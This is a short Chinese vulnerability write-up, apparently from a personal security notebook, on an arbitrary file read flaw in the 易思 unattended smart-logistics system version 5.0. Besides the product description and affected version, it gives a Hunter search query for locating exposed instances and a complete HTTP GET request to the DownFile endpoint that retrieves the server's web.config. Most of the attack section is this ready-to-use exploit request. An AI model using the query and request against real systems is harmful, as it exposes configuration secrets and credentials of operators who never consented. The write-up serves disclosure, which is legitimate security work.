# 易思智能物流无人值守系统downfile文件读取漏洞

# 一、漏洞简介
易思无人值守智能物流系统是一款集成了人工智能、机器人技术和物联网技术的创新产品。它能够自主完成货物存储、检索、分拣、装载以及配送等物流作业，帮助企业实现无人值守的智能物流运营，提高效率、降低成本，为现代物流行业带来新的发展机遇易思智能物流无人值守系统存在任意文件读取漏洞，攻击者可利用该漏洞获取敏感信息。

# 二、影响版本
+ 易思智能物流无人值守系统5.0

# 三、资产测绘
+ hunter`web.body=="易思无人值守智能物流"`
+ 登录页面

![1693024220415-3267a1b1-e688-4081-8abc-9bc7ee3c98f5.png](./img/zHmIGN6ZM2to5xhJ/1693024220415-3267a1b1-e688-4081-8abc-9bc7ee3c98f5-647498.png)

# 四、漏洞复现
```plain
GET /PublicInfoManage/Upload/DownFile?filePath=web.config  HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: ASP.NET_SessionId=c5z5wepqulqppvdagvif5dlv
Upgrade-Insecure-Requests: 1
```

![1700135803485-90ab3f35-bbdd-4c91-bf00-5e9736ac7ecb.png](./img/zHmIGN6ZM2to5xhJ/1700135803485-90ab3f35-bbdd-4c91-bf00-5e9736ac7ecb-494541.png)



> 更新: 2024-02-29 23:55:51  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/yd8bodau0wlc1qrf>